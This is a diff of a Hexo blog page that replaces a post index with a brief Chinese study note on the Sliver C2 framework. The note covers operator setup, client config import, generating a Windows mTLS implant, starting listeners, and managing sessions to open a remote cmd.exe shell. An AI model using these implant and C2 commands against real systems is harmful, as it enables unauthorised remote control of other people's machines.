@@ -8,7 +8,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            Hexo
+            sliver学习
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -31,291 +31,135 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/index.css">
-<div id="count"></div>
-<div id="header" >
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-title">章鱼海绵</h1>
-                <h2 class="header-description" id="hitokoto"></h2>
-                <h3 class="header-info" id="hitokotoAuthor"></h3>
+                <h1 class="header-subtitle">sliver学习</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-09-24
+                        </span>
+                        
+                            <span id="/2023/09/24/sliver学习/" class="leancloud_visitors" data-flag-title="sliver学习">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/09/24/sliver学习/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">小工具</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">小工具</span>
+                        
+                    
+                </div>
             
         </div>
     </div>
-    
-        <a class="scroll-down" href="javascript:;" target="_self" data-offset="-45">
-            <i class="scroll-down-icon iconfont icon-return"></i>
-        </a>
     
 </div>
 <div id="container">
     
-        
-            <!-- 首页 -->
-            <div class="articles">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <p>new-operator –name Dabiaoge –lhost Server服务器IP #新建一个client </p>
+<p>multiplayer # 开启多客户端共同管理（不开客户端无法连接）</p>
+<p>客户端连接<br>将服务端生成的校验文件，放到和客户端一个目录下，然后使用如下命令导入配置文件，运行即可。</p>
+<p>.&#x2F;sliver-client_linux import hack_192.168.1.107.cfg</p>
+<p>默认连接端口<br>Sliver默认连接端口为：31337</p>
+<p>可以编辑配置文件进行修改</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.sliver/configs/server.json</span><br></pre></td></tr></table></figure>
+
+<h2 id="Stager"><a href="#Stager" class="headerlink" title="Stager"></a>Stager</h2><p>在 Sliver C2 中，Stager 工作方式是基于一个配置文件（profiles），其中记载了一个 Implant 的所有定义及配置信息，该配置文件通过<code>profiles new</code> 命令创建。</p>
+<h2 id="生成shell"><a href="#生成shell" class="headerlink" title="生成shell"></a>生成shell</h2><p>generate –mtls <Server IP> –save .&#x2F;test.exe –os Windows</p>
+<p><code>--mtls</code>:监听协议（包括http、mtls、grpc ）</p>
+<p>如上一步，我们生成shell所用的监听协议为<code>mtls</code>，故我们要配置<code>mtls</code>类型的监听。 在终端执行命令</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtls</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p>通过输入<code>jobs</code>命令，可以查看目前开启的监听。</p>
+<p>默认端口是<code>8888</code> 如果要指定端口，执行命令</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtls -l <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>查看生成过的shell</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implants</span><br></pre></td></tr></table></figure>
+
+<p>运行shell后，server和client端都会得到会话的消息。主要包含session id、外网IP、主机名、平台、时间等等。</p>
+<p>sessions -i id  #进入会话 sessions -k id  #结束会话</p>
+<p>进入会话后，就和msf的控制台一样了。通过<code>help</code>命令，我们可以得到相关的执行参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell --shell-path &quot;C:\\windows\system32\cmd.exe&quot; #交互式shell</span><br></pre></td></tr></table></figure>
+
+
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/25/XSS%E6%9D%82%E8%AE%B0/">XSS杂记</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-25
-                            </span>
-                            
-                                <span id="/2023/03/25/XSS杂记/" class="leancloud_visitors" data-flag-title="XSS杂记">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/25/XSS杂记/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/09/24/sliver%E5%AD%A6%E4%B9%A0/" target="_blank">sliver学习</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="/categorie/%E5%B0%8F%E5%B7%A5%E5%85%B7/">小工具</a>
+                        
                     </div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/16/windows%E6%8F%90%E6%9D%83/">windows提权（搬运来的）</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-16
-                            </span>
-                            
-                                <span id="/2023/03/16/windows提权/" class="leancloud_visitors" data-flag-title="windows提权（搬运来的）">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/16/windows提权/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/%E5%B0%8F%E5%B7%A5%E5%85%B7/">小工具</a>
+                        
                     </div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/15/ciphey%E8%A7%A3%E7%A0%81/">ciphey解码</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-15
-                            </span>
-                            
-                                <span id="/2023/03/15/ciphey解码/" class="leancloud_visitors" data-flag-title="ciphey解码">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/15/ciphey解码/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/12/linux%E5%B0%8F%E6%8A%80%E5%B7%A7/">linux小技巧</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-12
-                            </span>
-                            
-                                <span id="/2023/03/12/linux小技巧/" class="leancloud_visitors" data-flag-title="linux小技巧">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/12/linux小技巧/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/09/mysql%E5%B0%8F%E6%93%8D%E4%BD%9C/">mysql小操作</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-09
-                            </span>
-                            
-                                <span id="/2023/03/09/mysql小操作/" class="leancloud_visitors" data-flag-title="mysql小操作">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/09/mysql小操作/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">php伪协议</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-08
-                            </span>
-                            
-                                <span id="/2023/03/08/php伪协议/" class="leancloud_visitors" data-flag-title="php伪协议">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/08/php伪协议/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Bdata/">php伪协议之data</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-08
-                            </span>
-                            
-                                <span id="/2023/03/08/php伪协议之data/" class="leancloud_visitors" data-flag-title="php伪协议之data">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/08/php伪协议之data/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Bfilter/">php伪协议之filter</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-07
-                            </span>
-                            
-                                <span id="/2023/03/07/php伪协议之filter/" class="leancloud_visitors" data-flag-title="php伪协议之filter">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/07/php伪协议之filter/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/03/04/burp%E5%AE%8F%E5%AE%9A%E4%B9%89%E7%BB%95%E8%BF%87%E7%88%86%E7%A0%B4/">burp宏定义绕过爆破</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-03-04
-                            </span>
-                            
-                                <span id="/2023/03/04/burp宏定义绕过爆破/" class="leancloud_visitors" data-flag-title="burp宏定义绕过爆破">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/03/04/burp宏定义绕过爆破/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2023/02/23/python%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%B0%8F%E8%AE%A1/">python脚本编写小计</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2023-02-23
-                            </span>
-                            
-                                <span id="/2023/02/23/python脚本编写小计/" class="leancloud_visitors" data-flag-title="python脚本编写小计">
-                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                </span>
-                            
-                            <span>
-                                <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/02/23/python脚本编写小计/"></span>
-                            </span>
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
+                <div class="article-prev-next">
+                    
+                        <a href="/2023/09/25/%E4%BF%A1%E6%81%AF%E5%B0%8F%E6%94%B6%E9%9B%86%E9%AA%8C%E8%AF%81/" class="prev-prefix">« </a> 上一篇：    <a href="/2023/09/25/%E4%BF%A1%E6%81%AF%E5%B0%8F%E6%94%B6%E9%9B%86%E9%AA%8C%E8%AF%81/" title="发布于 2023-09-25 10:10">信息小收集验证</a>
+                        <br>
+                    
+                    
+                        <a href="/2023/09/22/windows%E4%B8%AD%E7%9A%84token/" class="next-prefix">» </a> 下一篇：    <a href="/2023/09/22/windows%E4%B8%AD%E7%9A%84token/" title="发布于 2023-09-22 02:59">windows中的token</a>
+                    
+                </div>
             </div>
             
+    <div class="article-comments">
         
-    <div class="pagination-bottom">
-        <div class="pagination">
-            
-                <a class="extend prev" rel="prev" href="/page/2/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">下一页</a>
-            
-        </div>
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
     </div>
 
+        </div>
     
 </div>
     <div id="footer"></div>
@@ -341,7 +185,7 @@
             <div class="menu-list">
                 <ul>
                     
-                        <li class=" active "><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
                     
                         <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
                     
